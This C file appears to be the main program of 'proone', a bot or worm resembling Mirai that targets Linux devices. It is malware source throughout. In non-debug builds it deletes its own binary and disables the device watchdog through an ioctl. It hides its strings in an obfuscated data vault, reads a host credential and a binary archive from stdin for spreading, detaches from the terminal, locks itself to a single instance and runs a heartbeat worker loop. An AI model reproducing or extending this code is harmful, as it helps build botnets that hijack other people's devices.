#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/file.h>

#include "proone.h"
#include "proone_util.h"
#include "proone_dvault.h"
#include "proone_heartbeat-worker.h"


struct proone_global pne_global;


typedef struct {
    proone_worker_t worker;
    proone_worker_sched_req_t sched_req;
} worker_tuple_t;

typedef struct {
    struct pollfd *arr;
    size_t size;
} pollfd_pool_t;

static worker_tuple_t worker_pool[1];
static size_t worker_pool_size = 0;
static void (*proc_fin_call_ptr)(void) = NULL;
static bool finalising = false;
static pollfd_pool_t pollfd_pool;


static bool ensure_single_instance (void) {
    int fd;

    fd = shm_open(
        proone_dvault_unmask_entry_cstr(PROONE_DATA_KEY_PROC_LIM_SHM, NULL),
        O_RDWR | O_CREAT | O_TRUNC,
        0666);
    proone_dvault_reset_dict();
    if (fd < 0) {
        return true;
    }

    if (flock(fd, LOCK_EX | LOCK_NB) < 0) {
        return errno != EWOULDBLOCK;
    }
    else {
        pne_global.has_proc_lim_lock = true;
    }

    return true;
}

static void init_rnd_engine (void) {
    uint32_t seed = 0;
    int fd;
    proone_rnd_engnie_alloc_result_t ret;

    fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        read(fd, &seed, sizeof(uint32_t));
        close(fd);
    } 

    if (seed == 0) {
        // fall back to seeding with what's available.
        seed =
            (uint32_t)(time(NULL) % 0xFFFFFFFF) ^
            (uint32_t)(getpid() % 0xFFFFFFFF) ^
            (uint32_t)(getppid() % 0xFFFFFFFF) ^
            (uint32_t)(clock() % 0xFFFFFFFF);
    }
    
    ret = proone_alloc_rnd_engine(seed == 0 ? NULL : &seed);
    if (ret.result != PROONE_RND_ENGINE_ALLOC_OK) {
        abort();
    }

    pne_global.rnd = ret.engine;
}

static void delete_myself (const char *arg0) {
    static const char *proc_path = "/proc/self/exe";
    struct stat st;
    const char *path_to_unlink = NULL;
    char *path_buf = NULL;    
    
    // get real path of myself
    if (lstat(proc_path, &st) == 0 && (path_buf = (char*)malloc(st.st_size + 1)) != NULL && readlink(proc_path, path_buf, st.st_size + 1) == st.st_size) {
        path_buf[st.st_size] = 0;
        path_to_unlink = path_buf;
    }
    else {
        // try to delete arg0 instead
        path_to_unlink = arg0;
    }

    unlink(path_to_unlink);
    free(path_buf);
}

static void disasble_watchdog (void) {
    static const char *watchdog_paths[] = {
        "/dev/watchdog",
        "/dev/misc/watchdog"
    };
    static const int one = 1;
    int fd;
    size_t i;

    for (i = 0; i < sizeof(watchdog_paths) / sizeof(const char*); i += 1) {
        if ((fd = open(watchdog_paths[i], O_RDWR)) >= 0) {
            ioctl(fd, 0x80045704, &one);
            close(fd);
            break;
        }
    }
}

static void handle_interrupt (const int sig) {
    if (pne_global.caught_signal == 0) {
        pne_global.caught_signal = sig;
    }
    signal(sig, SIG_DFL);
}

static void proc_fin_call (void) {
    if (pne_global.caught_signal != 0) {
        size_t i;
        worker_tuple_t *wt;

        for (i = 0; i < worker_pool_size; i += 1) {
            wt = worker_pool + i;
            wt->worker.fin(wt->worker.ctx);
        }

        proc_fin_call_ptr = proone_empty_func;
        finalising = true;
    }
}

static void print_ready_signature (void) {
    size_t len;
    uint8_t *sig_data;
    char *plain_str, *sig_str;
    
    plain_str = proone_dvault_unmask_entry_cstr(PROONE_DATA_KEY_SIGN_INIT_OK, &len);

    sig_data = (uint8_t*)malloc(len + 1);
    sig_data[0] = (uint8_t)(proone_rnd_gen_int(pne_global.rnd) % 256);
    memcpy(sig_data + 1, plain_str, len);
    proone_dvault_reset_dict();
    proone_dvault_invert_mem(len, sig_data + 1, sig_data[0]);

    sig_str = proone_enc_base64_mem(sig_data, len);
    if (sig_str == NULL) {
        abort();
    }

    puts(sig_str);

    free(sig_str);
    free(sig_data);
}

static void read_host_credential (void) {
    static const size_t buf_size = (1 + 2 + 255 * 2) * 4 / 3;
    char *buf = (char*)malloc(buf_size);
    size_t i;
    bool found = false;

    for (i = 0; i < buf_size; i += 1) {
        if (read(STDIN_FILENO, &buf[i], 1) != 1) {
            goto END;
        }

        if (buf[i] == '\n') {
            found = true;
            break;
        }
    }
    if (found) {
        proone_dec_base64_mem(buf, i, &pne_global.host_cred_data, &pne_global.host_cred_size);
    }

END:
    free(buf);
}


int main (const int argc, char **args) {
    int exit_code = 0;
    size_t i;
    worker_tuple_t *wt;
    proone_worker_sched_info_t sched_info;

    pne_global.host_cred_data = NULL;
    pne_global.host_cred_size = 0;
    pne_global.has_proc_lim_lock = false;
    pne_global.bin_ready = false;
    pne_global.caught_signal = 0;
    pne_global.rnd = NULL;
    proone_init_unpack_bin_archive_result(&pne_global.bin_pack);
    proone_init_bin_archive(&pne_global.bin_archive);

    /* quick prep. IN THIS ORDER! */
    proone_init_dvault();
#ifndef DEBUG
    delete_myself(args[0]);
    disasble_watchdog();
#endif
    init_rnd_engine();

    print_ready_signature();
    read_host_credential();
    // get fed with the bin archive
    pne_global.bin_pack = proone_unpack_bin_archive(STDIN_FILENO);
    if (pne_global.bin_pack.result == PROONE_UNPACK_BIN_ARCHIVE_OK) {
        pne_global.bin_ready = proone_index_bin_archive(&pne_global.bin_pack, &pne_global.bin_archive) == PROONE_INDEX_BIN_ARCHIVE_OK;
    }
    
    // done with the terminal
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // install signal handlers
    // try to exit gracefully upon reception of these signals
    signal(SIGINT, handle_interrupt);
    signal(SIGTERM, handle_interrupt);
    signal(SIGCHLD, SIG_IGN);
#ifndef DEBUG
    signal(SIGPIPE, SIG_IGN);
#endif

    if (!ensure_single_instance()) {
        exit_code = 1;
        goto END;
    }

    // init workers
    if (proone_alloc_heartbeat_worker(&worker_pool[worker_pool_size].worker)) {
        worker_pool_size += 1;
    }

    // TODO

    for (i = 0; i < worker_pool_size; i += 1) {
        proone_init_worker_sched_req(&worker_pool[i].sched_req, NULL);
    }

    if (worker_pool_size == 0 || pne_global.caught_signal != 0) {
        goto END;
    }

    proc_fin_call_ptr = proc_fin_call;

    proone_succeed_or_die(clock_gettime(CLOCK_MONOTONIC, &sched_info.last_tick));
    pollfd_pool.arr = NULL;
    pollfd_pool.size = 0;
    while (true) {
        proone_worker_sched_flag_t all_sched_flag = PROONE_WORKER_SCHED_FLAG_NONE;
        struct timespec timeout;
        size_t total_pollfd_size = 0;
        bool worked = false;

        proone_succeed_or_die(clock_gettime(CLOCK_MONOTONIC, &sched_info.this_tick));
        sched_info.tick_diff = proone_sub_timespec(&sched_info.this_tick, &sched_info.last_tick);
        sched_info.real_tick_diff = proone_real_timespec(&sched_info.tick_diff);

        proc_fin_call_ptr();
        
        for (i = 0; i < worker_pool_size; i += 1) {
            wt = worker_pool + i;

            if (wt->worker.has_finalised(wt->worker.ctx)) {
                continue;
            }

            wt->worker.work(wt->worker.ctx, &sched_info, &wt->sched_req);
            worked |= true;

            if (wt->sched_req.flags & PROONE_WORKER_SCHED_FLAG_TIMEOUT) {
                if (all_sched_flag & PROONE_WORKER_SCHED_FLAG_TIMEOUT) {
                    if (proone_cmp_timespec(&timeout, &wt->sched_req.timeout) > 0) {
                        timeout = wt->sched_req.timeout;
                    }
                }
                else {
                    timeout = wt->sched_req.timeout;
                }
            }
            if (wt->sched_req.flags & PROONE_WORKER_SCHED_FLAG_POLL) {
                total_pollfd_size += wt->sched_req.pollfd_arr_size;
            }

            all_sched_flag |= wt->sched_req.flags;
        }

        sched_info.last_tick = sched_info.this_tick;

        if (!worked) {
            if (!finalising) {
                exit_code = 1;
            }
            break;
        }
        else if (all_sched_flag & PROONE_WORKER_SCHED_FLAG_POLL) {
            void *ny_mem;
            size_t pollfd_ptr;

            /* FIXME: `total_pollfd_size` could be zero if there's some bug in
            * one of the workers.
            */
            ny_mem = realloc(pollfd_pool.arr, total_pollfd_size * sizeof(struct pollfd));
            if (ny_mem != NULL) {
                pollfd_pool.arr = (struct pollfd*)ny_mem;
                pollfd_pool.size = total_pollfd_size;

                pollfd_ptr = 0;
                for (i = 0; i < worker_pool_size; i += 1) {
                    wt = &worker_pool[i];

                    if (wt->worker.has_finalised(wt->worker.ctx)) {
                        continue;
                    }
                    
                    if (wt->sched_req.flags & PROONE_WORKER_SCHED_FLAG_POLL) {
                        wt->sched_req.pollfd_ready = false;
                        memcpy(pollfd_pool.arr + pollfd_ptr, wt->sched_req.pollfd_arr, wt->sched_req.pollfd_arr_size * sizeof(struct pollfd));
                        pollfd_ptr += wt->sched_req.pollfd_arr_size;
                    }
                }

                if (ppoll(pollfd_pool.arr, pollfd_pool.size, all_sched_flag & PROONE_WORKER_SCHED_FLAG_TIMEOUT ? &timeout : NULL, NULL) < 0) {
                    switch (errno) {
                    case EINTR:
                    case ENOMEM:
                        break;
                    default:
                        abort();
                    }
                }
                else {
                    pollfd_ptr = 0;
                    for (i = 0; i < worker_pool_size; i += 1) {
                        wt = &worker_pool[i];

                        if (wt->worker.has_finalised(wt->worker.ctx)) {
                            continue;
                        }

                        if (wt->sched_req.flags & PROONE_WORKER_SCHED_FLAG_POLL) {
                            wt->sched_req.pollfd_ready = true;
                            memcpy(wt->sched_req.pollfd_arr, pollfd_pool.arr + pollfd_ptr, wt->sched_req.pollfd_arr_size);
                            pollfd_ptr += wt->sched_req.pollfd_arr_size;
                        }
                    }
                }
            }
        }
        else if (all_sched_flag & PROONE_WORKER_SCHED_FLAG_TIMEOUT) {
            if (nanosleep(&timeout, NULL) < 0 && errno != EINTR) {
                abort();
            }
        }
    }

END:
    free(pollfd_pool.arr);
    pollfd_pool.arr = NULL;
    pollfd_pool.size = 0;

    for (i = 0; i < worker_pool_size; i += 1) {
        wt = &worker_pool[i];
        wt->worker.free(wt->worker.ctx);
        wt->sched_req.mem_func.free(&wt->sched_req);
    }

    free(pne_global.host_cred_data);
    pne_global.host_cred_data = NULL;
    pne_global.host_cred_size = 0;

    if (pne_global.has_proc_lim_lock) {
        shm_unlink(proone_dvault_unmask_entry_cstr(PROONE_DATA_KEY_PROC_LIM_SHM, NULL));
        proone_dvault_reset_dict();
        pne_global.has_proc_lim_lock = false;
    }

    proone_free_bin_archive(&pne_global.bin_archive);
    proone_free_unpack_bin_archive_result(&pne_global.bin_pack);
    pne_global.bin_ready = false;
    
    proone_free_rnd_engine(pne_global.rnd);
    pne_global.rnd = NULL;

    proone_deinit_dvault();

    return exit_code;
}
